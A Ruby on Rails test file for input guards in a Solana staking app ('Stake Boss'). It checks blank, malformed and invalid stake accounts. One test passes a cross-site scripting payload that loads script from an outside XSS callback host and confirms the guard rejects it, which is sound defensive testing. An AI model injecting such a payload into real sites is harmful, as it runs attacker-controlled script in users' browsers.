# frozen_string_literal: true

require 'test_helper'

# Valid regular account: testarBnsk6ZVZWthoBAmbn5wyA35Nc2Dr7QWWV9TRv
# Valid stake account:   BbeCzMU39ceqSgQoNs9c1j2zes7kNcygew8MEjEBvzuY
# Invalid stake account: BbeCzMU39ceqSgQoNs9c1j2zes7kNcygew8MEjEBvzuZ

class StakeBossLogicTest < ActiveSupport::TestCase
  include StakeBossLogic

  def setup
    # Create our initial payload with the input values
    @initial_payload = {
      config_urls: ['https://testnet.solana.com:8899'],
      network: 'testnet',
      stake_account: 'BbeCzMU39ceqSgQoNs9c1j2zes7kNcygew8MEjEBvzuY'
    }
  end

  # Show that the input guards are working
  test 'guard_input_blank' do
    # Blank input
    p = Pipeline.new(200, @initial_payload.merge(stake_account: nil))
                .then(&guard_input)
    assert_equal 500, p.code
    assert_equal StakeBossLogic::InvalidStakeAccount, p.errors.class
    assert_equal 'Invalid Stake Account: Blank Address', p.errors.message
  end

  test 'guard_input_javascript' do
    # javascript
    account = '"><script src=https://certus.xss.ht></script>'
    p = Pipeline.new(200, @initial_payload.merge(stake_account: account))
                .then(&guard_input)

    assert_equal 500,
                 p.code
    assert_equal StakeBossLogic::InvalidStakeAccount,
                 p.errors.class
    assert_equal 'Invalid Stake Account: Hi Leo, javascript is not allowed!',
                 p.errors.message
  end

  test 'guard_input_wrong_length' do
    # Blank input
    p = Pipeline.new(200, @initial_payload.merge(stake_account: 'test'))
                .then(&guard_input)

    assert_equal 500,
                 p.code
    assert_equal StakeBossLogic::InvalidStakeAccount,
                 p.errors.class
    assert_equal 'Invalid Stake Account: Address is wrong size',
                 p.errors.message
  end

  test 'guard_invalid_stake_account' do
    address = 'BbeCzMU39ceqSgQoNs9c1j2zes7kNcygew8MEjEBvzuZ'
    json_data = \
      File.read("#{Rails.root}/test/stubs/solana_stake_account_#{address}.json")

    SolanaCliService.stub(
      :request,
      json_data,
      [address, TESTNET_CLUSTER_URLS]
    ) do

      p = Pipeline.new(200, @initial_payload.merge(stake_account: address))
                  .then(&guard_input)
                  .then(&guard_stake_account)

      assert_equal 500,
                   p.code
      assert_equal StakeBossLogic::InvalidStakeAccount,
                   p.errors.class
      assert_equal 'Invalid Stake Account: Not a valid Stake Account',
                   p.errors.message

    end
  end

  test 'guard_stake_boss_does_not_have_stake_authority' do
    address = '2tgq1PZGanqgmmLcs3PDx8tpr7ny1hFxaZc2LP867JuS'
    json_data = \
      File.read("#{Rails.root}/test/stubs/solana_stake_account_#{address}.json")

    SolanaCliService.stub(
      :request,
      json_data,
      [address, TESTNET_CLUSTER_URLS]
    ) do

      p = Pipeline.new(200, @initial_payload.merge(stake_account: address))
                  .then(&guard_input)
                  .then(&guard_stake_account)

      assert_equal 500,
                   p.code
      assert_equal StakeBossLogic::InvalidStakeAccount,
                   p.errors.class
      assert_equal 'Invalid Stake Account: Stake Boss needs Stake Authority',
                   p.errors.message

    end
  end
end
